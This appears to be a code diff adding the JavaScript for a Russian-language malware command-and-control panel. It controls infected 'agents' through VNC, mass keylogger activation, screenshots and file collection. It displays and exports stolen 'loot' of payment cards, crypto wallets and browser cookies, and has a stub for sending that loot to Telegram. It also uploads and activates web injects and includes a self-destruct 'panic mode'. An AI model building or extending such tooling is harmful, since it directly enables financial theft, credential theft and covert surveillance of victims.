+    for(let i=0;i<data.total_agents;i++){
+        ctx.beginPath();
+        ctx.arc(30+Math.random()*140,30+Math.random()*60,10,0,2*Math.PI);
+        ctx.fillStyle = '#00ffe7cc';
+        ctx.shadowColor = '#00ffe7';
+        ctx.shadowBlur = 16;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+    }
+}
+window.loadMetrics = loadMetrics;
+
+// --- Уведомления ---
+function showToast(msg) {
+    let toast = document.createElement('div');
+    toast.textContent = msg;
+    toast.style.position = 'fixed';
+    toast.style.bottom = '2em';
+    toast.style.right = '2em';
+    toast.style.background = '#00ffe7';
+    toast.style.color = '#181c24';
+    toast.style.padding = '1em 2em';
+    toast.style.borderRadius = '8px';
+    toast.style.fontWeight = 'bold';
+    toast.style.zIndex = 9999;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 2500);
+}
+
+// --- Вспомогательные ---
+function formatTime(ts) {
+    if(!ts) return '';
+    const d = new Date(ts*1000);
+    return d.toLocaleString();
+}
+
+// --- Управление агентами ---
+document.querySelector('#agents-table').addEventListener('click', async e => {
+    const tr = e.target.closest('tr');
+    if(!tr) return;
+    const agent_id = tr.children[0].textContent;
+    if(e.target.closest('[title="VNC"]')) {
+        const res = await fetch(`/api/agent/${agent_id}/vnc`, {method:'POST'});
+        const data = await res.json();
+        showToast(data.message || 'VNC активирован');
+    }
+    if(e.target.closest('[title="Скриншот"]')) {
+        const res = await fetch(`/api/agent/${agent_id}/screenshot`, {method:'POST'});
+        const data = await res.json();
+        showToast(data.success ? 'Скриншот сделан' : (data.error || 'Ошибка скриншота'));
+    }
+    if(e.target.closest('[title="Файлы"]')) {
+        // Фильтровать файлы по агенту
+        document.getElementById('agent-search').value = agent_id;
+        tabs.forEach(t => t.classList.remove('active'));
+        tabContents.forEach(tc => tc.classList.remove('active'));
+        document.querySelector('.tab[data-tab="files"]').classList.add('active');
+        document.getElementById('tab-files').classList.add('active');
+        loadFiles();
+    }
+    if(e.target.closest('[title="Открыть чат"]')) {
+        window.location = `/agent/${agent_id}/chat`;
+    }
+    if(e.target.closest('[title="VNC"]')) e.preventDefault();
+});
+// Массовые действия управления (VNC, кейлоггер, screenshot)
+document.querySelector('#tab-control').addEventListener('click', async e => {
+    if(e.target.closest('.action-btn')) {
+        let action = e.target.closest('.action-btn').textContent.trim();
+        let agents = Array.from(document.querySelectorAll('#agents-table tbody tr')).map(tr => tr.children[0].textContent);
+        if(action.includes('VNC')) {
+            for(const agent_id of agents) {
+                await fetch(`/api/agent/${agent_id}/vnc`, {method:'POST'});
+            }
+            showToast('VNC активирован на всех');
+        }
+        if(action.includes('кейлоггер')) {
+            for(const agent_id of agents) {
+                await fetch(`/api/agent/${agent_id}/keylogger`, {method:'POST'});
+            }
+            showToast('Кейлоггер активирован на всех');
+        }
+        if(action.includes('Скриншот')) {
+            for(const agent_id of agents) {
+                await fetch(`/api/agent/${agent_id}/screenshot`, {method:'POST'});
+            }
+            showToast('Скриншоты сделаны');
+        }
+        if(action.includes('Инъекция')) {
+            showToast('Инъекция: функция в разработке');
+        }
+    }
+});
+
+// --- WebSocket live updates ---
+let ws = null;
+function connectWS() {
+    ws = new WebSocket((location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws/dashboard');
+    const wsStatus = document.getElementById('ws-status');
+    ws.onopen = () => { wsStatus.classList.remove('offline'); wsStatus.innerHTML = '<span class="ws-dot"></span> LIVE'; };
+    ws.onclose = () => { wsStatus.classList.add('offline'); wsStatus.innerHTML = '<span class="ws-dot"></span> OFFLINE'; setTimeout(connectWS, 3000); };
+    ws.onerror = () => { ws.close(); };
+    ws.onmessage = e => {
+        let event = {};
+        try { event = JSON.parse(e.data); } catch { return; }
+        if(event.type === 'file' && event.action === 'add') {
+            // Добавить строку в таблицу файлов с анимацией
+            if(document.getElementById('tab-files').classList.contains('active')) {
+                const tbody = document.querySelector('#files-table tbody');
+                const tr = document.createElement('tr');
+                tr.classList.add('new-row');
+                tr.innerHTML = `
+                    <td><input type='checkbox' class='file-checkbox' data-id='${event.file.file_id}'></td>
+                    <td>${event.file.name}</td>
+                    <td>${event.file.agent_id}</td>
+                    <td>${event.file.size}</td>
+                    <td>${event.file.category}</td>
+                    <td>${formatTime(event.file.timestamp)}</td>
+                    <td>
+                        <button class='action-btn' title='Скачать' onclick='downloadFile("${event.file.file_id}")'><i class='fa-solid fa-download'></i></button>
+                        <button class='action-btn' title='Удалить' onclick='deleteFiles(["${event.file.file_id}"])'><i class='fa-solid fa-trash'></i></button>
+                    </td>
+                `;
+                tbody.prepend(tr);
+                setTimeout(()=>tr.classList.remove('new-row'), 2000);
+            }
+            // Обновить графики и метрики
+            loadMetrics();
+        }
+        // Можно добавить обработку других типов событий (лог, атака, статус)
+    };
+}
+connectWS();
+
+// --- Инициализация ---
+if(document.querySelector('.tab.active').dataset.tab === 'files') loadFiles();
+if(document.querySelector('.tab.active').dataset.tab === 'logs') loadLogs();
+if(document.querySelector('.tab.active').dataset.tab === 'metrics') loadMetrics();
+
+// --- Лут ---
+async function loadLoot() {
+    const search = document.getElementById('loot-search').value.toLowerCase();
+    const type = document.getElementById('loot-type-filter').value;
+    // Получаем все типы лута
+    const [cards, wallets, cookies] = await Promise.all([
+        fetch('/api/loot/cards').then(r=>r.json()).then(d=>d.cards||[]),
+        fetch('/api/loot/wallets').then(r=>r.json()).then(d=>d.wallets||[]),
+        fetch('/api/loot/cookies').then(r=>r.json()).then(d=>d.cookies||[])
+    ]);
+    let loot = [];
+    loot = loot.concat(cards.map(l=>({...l, _type:'card'})));
+    loot = loot.concat(wallets.map(l=>({...l, _type:'wallet'})));
+    loot = loot.concat(cookies.map(l=>({...l, _type:'cookie'})));
+    // Фильтрация
+    loot = loot.filter(l => {
+        if(type && l._type!==type) return false;
+        if(search) {
+            const val = (l.card||l.wallet||l.cookie||'')+','+(l.agent_id||'')+','+(l.tags||'')+','+(l.notes||'');
+            if(!val.toLowerCase().includes(search)) return false;
+        }
+        return true;
+    });
+    // Сортировка по времени (новые сверху)
+    loot.sort((a,b)=>b.timestamp-a.timestamp);
+    // Рендер
+    const tbody = document.querySelector('#loot-table tbody');
+    tbody.innerHTML = '';
+    loot.forEach(l => {
+        const tr = document.createElement('tr');
+        tr.classList.add('new-row');
+        tr.innerHTML = `
+            <td>${l._type==='card'?'💳':l._type==='wallet'?'🪙':'🍪'}</td>
+            <td style="font-family:monospace;">${l.card||l.wallet||l.cookie}</td>
+            <td>${l.agent_id}</td>
+            <td>${formatTime(l.timestamp)}</td>
+            <td contenteditable="true">${l.tags||''}</td>
+            <td contenteditable="true">${l.notes||''}</td>
+            <td>
+                <button class="action-btn" title="Скопировать" onclick="navigator.clipboard.writeText('${l.card||l.wallet||l.cookie}')"><i class="fa-solid fa-copy"></i></button>
+                <button class="action-btn" title="Скачать"><i class="fa-solid fa-download"></i></button>
+            </td>
+        `;
+        tbody.appendChild(tr);
+        setTimeout(()=>tr.classList.remove('new-row'), 2000);
+    });
+    ensureTableNotEmpty('loot-table');
+}
+document.getElementById('loot-search').addEventListener('input', loadLoot);
+document.getElementById('loot-type-filter').addEventListener('change', loadLoot);
+document.getElementById('loot-collect-all').addEventListener('click', ()=>{
+    showToast('Сбор лута со всех агентов запущен (заглушка)');
+});
+window.loadLoot = loadLoot;
+
+// --- Web-injects ---
+async function loadInjects() {
+    const res = await fetch('/api/injects/list');
+    const data = await res.json();
+    const tbody = document.querySelector('#injects-table tbody');
+    tbody.innerHTML = '';
+    data.injects.forEach(inj => {
+        const tr = document.createElement('tr');
+        tr.classList.add('new-row');
+        tr.innerHTML = `
+            <td>${inj.name}</td>
+            <td>${formatTime(inj.uploaded)}</td>
+            <td>${inj.active?'<span style=\'color:#00ff6a;font-weight:bold;\'>Активен</span>':'<span style=\'color:#aaa;\'>Неактивен</span>'}</td>
+            <td>${inj.stats && Object.keys(inj.stats).length ? JSON.stringify(inj.stats) : '-'}</td>
+            <td>
+                <button class="action-btn" onclick="activateInject('${inj.id}')"><i class="fa-solid fa-bolt"></i> Активировать</button>
+            </td>
+        `;
+        tbody.appendChild(tr);
+        setTimeout(()=>tr.classList.remove('new-row'), 2000);
+    });
+    ensureTableNotEmpty('injects-table');
+}
+window.loadInjects = loadInjects;
+async function activateInject(id) {
+    await fetch('/api/injects/activate', {method:'POST',body:new URLSearchParams({inject_id:id})});
+    showToast('Инъекция активирована');
+    loadInjects();
+}
+document.getElementById('inject-upload').addEventListener('change', async e => {
+    for(const file of e.target.files) {
+        const form = new FormData();
+        form.append('file', file);
+        await fetch('/api/injects/upload', {method:'POST',body:form});
+        showToast('Инъекция загружена');
+    }
+    loadInjects();
+});
+
+// --- Виджеты топ-лут/свежие карты/кошельки ---
+async function loadLootWidgets() {
+    const res = await fetch('/api/metrics');
+    const data = await res.json();
+    // Топ-агенты по луту
+    const topList = document.getElementById('top-loot-agents-list');
+    topList.innerHTML = '';
+    (data.top_loot_agents||[]).forEach(a => {
+        const li = document.createElement('li');
+        li.innerHTML = `<span style='color:#ffe700;font-weight:bold;'>${a.agent_id}</span> <span style='color:#aaa;'>(${a.loot} лута)</span>`;
+        topList.appendChild(li);
+    });
+    // Свежие карты
+    const cardsList = document.getElementById('fresh-cards-list');
+    cardsList.innerHTML = '';
+    (data.fresh_cards||[]).forEach(c => {
+        cardsList.innerHTML += `<li style='margin-bottom:0.3em;'><span style='color:#00ffe7;font-family:monospace;'>${c.card}</span> <span style='color:#aaa;'>${formatTime(c.timestamp)}</span></li>`;
+    });
+    // Свежие кошельки
+    const walletsList = document.getElementById('fresh-wallets-list');
+    walletsList.innerHTML = '';
+    (data.fresh_wallets||[]).forEach(w => {
+        walletsList.innerHTML += `<li style='margin-bottom:0.3em;'><span style='color:#00ff6a;font-family:monospace;'>${w.wallet}</span> <span style='color:#aaa;'>${formatTime(w.timestamp)}</span></li>`;
+    });
+}
+window.loadLootWidgets = loadLootWidgets;
+
+// --- Мини-карта заражённых систем (демо) ---
+function drawMinimap() {
+    const minimap = document.getElementById('minimap-canvas');
+    if(!minimap) return;
+    const ctx = minimap.getContext('2d');
+    ctx.clearRect(0,0,200,120);
+    for(let i=0;i<8;i++){
+        ctx.beginPath();
+        ctx.arc(30+Math.random()*140,30+Math.random()*60,10,0,2*Math.PI);
+        ctx.fillStyle = '#00ffe7cc';
+        ctx.shadowColor = '#00ffe7';
+        ctx.shadowBlur = 16;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+    }
+}
+window.drawMinimap = drawMinimap;
+
+// --- AI Decisions (reasoning-логика, демо) ---
+function loadAIDecisions() {
+    const log = document.getElementById('ai-decisions-log');
+    log.innerHTML = '';
+    const demo = [
+        '[AI] Нет reasoning-данных. Ожидание действий агента...'
+    ];
+    demo.forEach(line => {
+        const div = document.createElement('div');
+        div.textContent = line;
+        log.appendChild(div);
+    });
+}
+window.loadAIDecisions = loadAIDecisions;
+
+// --- Вкладки ---
+document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        if(tab.dataset.tab==='loot') loadLoot();
+        if(tab.dataset.tab==='injects') loadInjects();
+        if(tab.dataset.tab==='ai') { loadLootWidgets(); loadAIDecisions(); drawMinimap(); }
+    });
+});
+// Инициализация
+if(document.querySelector('.tab.active').dataset.tab==='loot') loadLoot();
+if(document.querySelector('.tab.active').dataset.tab==='injects') loadInjects();
+if(document.querySelector('.tab.active').dataset.tab==='ai') { loadLootWidgets(); loadAIDecisions(); drawMinimap(); }
+
+// --- Темы ---
+document.getElementById('theme-select').addEventListener('change', e => {
+    document.body.className = e.target.value ? 'theme-'+e.target.value : '';
+});
+
+// --- Panic mode ---
+document.getElementById('panic-btn').addEventListener('click', ()=>{
+    showToast('Panic mode активирован! Все агенты получат команду self-destruct (заглушка)');
+});
+
+// --- Экспорт лута ---
+function exportLoot(format) {
+    const rows = Array.from(document.querySelectorAll('#loot-table tbody tr'));
+    let data = rows.map(tr => {
+        const tds = tr.querySelectorAll('td');
+        return {
+            type: tds[0].textContent,
+            value: tds[1].textContent,
+            agent: tds[2].textContent,
+            time: tds[3].textContent,
+            tags: tds[4].textContent,
+            notes: tds[5].textContent
+        };
+    });
+    if(format==='csv') {
+        let csv = 'type,value,agent,time,tags,notes\n'+data.map(d=>`${d.type},${d.value},${d.agent},${d.time},${d.tags},${d.notes}`).join('\n');
+        downloadFileContent(csv, 'loot.csv', 'text/csv');
+    } else if(format==='json') {
+        downloadFileContent(JSON.stringify(data,null,2), 'loot.json', 'application/json');
+    } else if(format==='txt') {
+        let txt = data.map(d=>`${d.type}: ${d.value} | ${d.agent} | ${d.time} | ${d.tags} | ${d.notes}`).join('\n');
+        downloadFileContent(txt, 'loot.txt', 'text/plain');
+    }
+}
+function downloadFileContent(content, filename, mime) {
+    const blob = new Blob([content], {type: mime});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = filename; a.click();
+    setTimeout(()=>URL.revokeObjectURL(url), 1000);
+}
+document.getElementById('loot-export-csv').addEventListener('click', ()=>exportLoot('csv'));
+document.getElementById('loot-export-json').addEventListener('click', ()=>exportLoot('json'));
+document.getElementById('loot-export-txt').addEventListener('click', ()=>exportLoot('txt'));
+document.getElementById('loot-send-telegram').addEventListener('click', ()=>{
+    showToast('Лут отправлен в Telegram (заглушка, интеграция через бота)');
+});
+
+// --- Заглушки для пустых таблиц ---
+function ensureTableNotEmpty(tableId) {
+    const tbody = document.querySelector(`#${tableId} tbody`);
+    if(tbody && tbody.children.length === 0) {
+        const tr = document.createElement('tr');
+        const td = document.createElement('td');
+        td.colSpan = tbody.parentElement.querySelectorAll('th').length;
+        td.style.textAlign = 'center';
+        td.style.color = '#888';
+        td.textContent = 'Нет данных';
+        tr.appendChild(td);
+        tbody.appendChild(tr);
+    }
+}
+
+// --- Переопределить load-функции для заглушек ---
+const origLoadLoot = window.loadLoot;
+window.loadLoot = async function() { await origLoadLoot(); ensureTableNotEmpty('loot-table'); };
+const origLoadInjects = window.loadInjects;
+window.loadInjects = async function() { await origLoadInjects(); ensureTableNotEmpty('injects-table'); };
+const origLoadFiles = window.loadFiles;
+window.loadFiles = async function() { await origLoadFiles(); ensureTableNotEmpty('files-table'); };
+const origLoadLogs = window.loadLogs;
+window.loadLogs = async function() { await origLoadLogs(); ensureTableNotEmpty('logs-table'); };
+const origLoadAgents = function() {
+    // Если есть функция загрузки агентов — добавить заглушку
+    ensureTableNotEmpty('agents-table');
+};
+window.loadAgents = origLoadAgents;
+
+function showReasoningModal(agentId) {
+    const modal = document.getElementById('reasoning-modal');
+    const content = document.getElementById('reasoning-content');
+    modal.style.display = 'flex';
+    content.innerHTML = '<div style="text-align:center; color:#aaa;">Загрузка...</div>';
+    fetch(`/api/agent/${agentId}/reasoning`, {method: 'POST'})
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                let html = '';
+                html += '<h3>Рекомендации:</h3><ul>';
+                for (const rec of data.recommendations) {
+                    html += `<li>${rec}</li>`;
+                }
+                html += '</ul>';
+                html += '<h4>Reasoning-логи:</h4><div style="max-height:180px; overflow:auto; background:#181c24; border-radius:6px; padding:0.7em; font-size:0.97em;">';
+                for (const log of data.reasoning_logs) {
+                    html += `<div><span style=\"color:#00ffe7;\">[${log.timestamp}]</span> <b>${log.type}</b>: ${log.message}</div>`;
+                }
+                html += '</div>';
+                content.innerHTML = html;
+            } else {
+                content.innerHTML = `<div style='color:#ff4e4e;'>Ошибка: ${data.message}</div>`;
+            }
+        })
+        .catch(e => {
+            content.innerHTML = `<div style='color:#ff4e4e;'>Ошибка запроса: ${e}</div>`;
+        });
+}
+function closeReasoningModal() {
+    document.getElementById('reasoning-modal').style.display = 'none';
+}
+</script>
+{% endblock %} 
